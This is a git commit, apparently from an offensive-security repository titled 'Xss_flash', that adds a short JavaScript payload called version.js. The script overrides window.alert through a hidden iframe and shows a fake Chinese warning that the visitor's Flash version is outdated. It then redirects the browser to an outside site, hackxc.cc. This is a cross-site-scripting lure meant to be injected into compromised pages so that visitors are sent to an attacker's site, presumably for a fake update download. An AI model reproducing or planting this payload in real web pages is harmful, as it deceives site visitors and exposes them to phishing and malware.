4927350012e183e480edf33226a70693d20600b4
hackxc <758682207@qq.com>
2020-04-11 20:43:26 +0800

    Xss_flash

---
+++ version.js
@@ -0,0 +1,10 @@
+﻿window.alert = function(name){
+var iframe = document. createElement("IFRAME");
+iframe.style.display="none";
+iframe.setAttribute("src",'data:text/plain,');
+document. documentElement.appendChild(iframe);
+window.frames [0].window.alert(name);
+iframe.parentNode.removeChild(iframe);
+}
+alert( "您的FLASH版本过低，尝试升级后访问该页面! ");
+window. location.href="http://www.hackxc.cc";
